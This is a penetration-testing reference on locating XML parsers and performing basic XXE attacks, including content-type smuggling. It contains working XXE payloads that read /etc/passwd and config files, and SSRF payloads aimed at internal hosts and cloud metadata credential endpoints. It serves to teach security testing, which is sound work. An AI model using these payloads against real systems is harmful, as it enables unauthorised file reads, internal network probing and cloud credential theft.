# Finding XML Parsers & Basic XXE

## Where XML parsers hide

```
Obvious:     /api/*.xml endpoints, SOAP services, RSS/Atom feeds
Upload-based: SVG images, DOCX/XLSX/PPTX (Office Open XML — a zip
              file full of XML internally), ODT/ODS/ODP, PDF (some
              PDF features embed XML)
Identity:    SAML assertions and metadata (XML-based by spec) —
              identity/SSO integration points are a classic place to
              find under-hardened, shared XML-parsing libraries
Hidden:      Any REST endpoint nominally expecting JSON or form data
             that a permissive framework will still parse as XML if
             you simply change the Content-Type header
```

## Content-type smuggling: converting a non-XML endpoint into an XML parser

Many frameworks accept multiple content types on the same endpoint without the developer realizing it, because the framework's content negotiation is more permissive than the documented API surface:

```
Original request:
  Content-Type: application/x-www-form-urlencoded
  foo=bar

Try:
  Content-Type: text/xml
  <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

Or, for JSON endpoints, convert the JSON body structure into an
equivalent XML body (Burp's "Content Type Converter" extension
automates this transformation):
  Content-Type: application/json
  {"firstName": "John", "lastName": "Doe"}
  -->
  Content-Type: application/xml
  <?xml version="1.0" encoding="UTF-8"?>
  <root><firstName>John</firstName><lastName>Doe</lastName></root>
```
If the server accepts the XML version and returns an equivalent result, you've just converted an apparently JSON-only endpoint into XML attack surface nobody intended to expose.

## Basic (in-band) XXE — file read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```
If the application reflects the parsed value back in its response, the file's contents appear directly — this is the simplest, most directly provable variant. Confirm with a real, recognizable file (`/etc/passwd`, `/etc/hostname`, `win.ini`) before moving on to sensitive application-specific targets (`.env`, `config.php`, `application.properties`, `web.config`).

## SSRF via XXE

Point the external entity at a URL instead of a local file — the XML parser makes the request on the server's behalf, exactly like any other SSRF primitive, just delivered through entity resolution instead of a URL-shaped parameter:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.1/secret.txt"> ]>
<root><data>&xxe;</data></root>
```
High-value SSRF targets, same priority order as any other SSRF primitive:
```
Localhost / 127.0.0.1 (often exposes an admin interface, metrics
  endpoint, or debug API not meant to be reachable externally)
Internal-only hostnames/IP ranges
Cloud metadata services:
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://metadata.google.internal/computeMetadata/v1/  (needs
    Metadata-Flavor: Google header — XXE alone often can't set
    custom headers, so this specific target may need the request
    to go through a redirect or a service that doesn't require it)
```
Confirm via response content reflected back, a measurable timing difference (request succeeded vs. connection refused/timeout), or an OAST interaction if nothing is reflected — see `blind-xxe-and-oob-exfiltration.md` for the blind case.

## Confirming, not just attempting

A `<!DOCTYPE>`/`<!ENTITY>` declaration being *accepted* with no error is not yet a finding — you need either real file content in the response, a confirmed backend request reaching its target (response content, timing, or OOB), or move to the blind techniques in the next reference file. An XML parsing error on its own just tells you XML is being parsed somewhere; it doesn't yet tell you entity resolution succeeded.
